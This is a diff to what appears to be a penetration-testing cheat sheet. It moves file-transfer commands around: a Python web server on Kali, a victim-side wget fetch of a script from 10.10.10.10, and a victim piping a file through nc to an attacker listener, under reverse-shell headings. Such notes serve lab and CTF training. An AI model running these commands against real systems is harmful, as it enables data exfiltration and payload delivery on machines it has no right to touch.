@@ -4,9 +4,13 @@
 
 ### With Python
 
-Kali: ```python3 -m http.server 8888``` or ```python -m SimpleHTTPServer 80```
+```
+python3 -m http.server 8888
+``` 
 
-Victim: ```wget http://10.10.10.10:8888/something.sh -O something.sh```
+```
+python -m SimpleHTTPServer 8888
+```
 
 ## Upgrade reverse shell
 
@@ -32,6 +36,12 @@ Victim: ```python3 -c 'import pty; pty.spawn("/bin/sh")'```
 Victim: ```cat file.txt | nc -q 0 10.10.10.10 4444```
 
 Kali:   ```nc -lvp 4444 > file.txt```
+
+### With web server
+
+Kali: ```python3 -m http.server 8888``` or ```python -m SimpleHTTPServer 8888```
+
+Victim: ```wget http://10.10.10.10:8888/something.sh -O something.sh```
 
 ## Reverse shells
 
